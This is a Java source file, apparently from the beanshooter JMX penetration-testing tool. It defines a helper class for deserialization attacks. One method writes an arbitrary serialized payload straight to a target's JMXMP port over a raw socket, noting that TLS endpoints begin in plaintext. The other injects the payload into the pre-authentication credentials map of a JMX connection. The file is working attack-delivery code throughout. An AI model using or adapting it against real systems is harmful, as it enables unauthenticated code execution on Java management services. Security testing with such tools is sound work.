package de.qtc.beanshooter.operation;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;

import javax.management.remote.JMXConnector;

import de.qtc.beanshooter.cli.ArgumentHandler;
import de.qtc.beanshooter.exceptions.AuthenticationException;
import de.qtc.beanshooter.io.Logger;
import de.qtc.beanshooter.plugin.PluginSystem;

/**
 * Helper class to assist during deserialization attacks.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class SerialHelper
{
    /**
     * The JMXMP protocol starts with serialized Java objects right away. There is no need for a handshake
     * or something like this and the payload can be send directly. This is even true for TLS protected
     * JMXMP endpoints. When TLS protected, the JMXMP protocol still starts with a plaintext communication
     * and switches over to TLS after exchanging some messages. We can therefore just open a simple TCP
     * connection and send our payload object.
     *
     * @param payload payload object to send
     * @throws IOException
     */
    public static void serialJMXMP(Object payload) throws IOException
    {
        String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
        int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);

        try(Socket sock = new Socket(host, port))
        {
            ObjectOutputStream objOut = new ObjectOutputStream(sock.getOutputStream());
            objOut.writeObject(payload);
        }
    }

    /**
     * Send the deserialization payload within the JMXConnector.CREDENTIALS key of the environment
     * map.
     *
     * @param payload payload object to send
     * @throws AuthenticationException
     */
    public static void serialPreauth(Object payload) throws AuthenticationException
    {
        String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
        int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);

        Map<String,Object> env = new HashMap<String,Object>();
        env.put(JMXConnector.CREDENTIALS, payload);

        PluginSystem.getMBeanServerConnectionUmanaged(host, port, env);
        Logger.printlnMixedYellow("Remote MBeanServer",  "accepted", "the payload class.");
    }
}
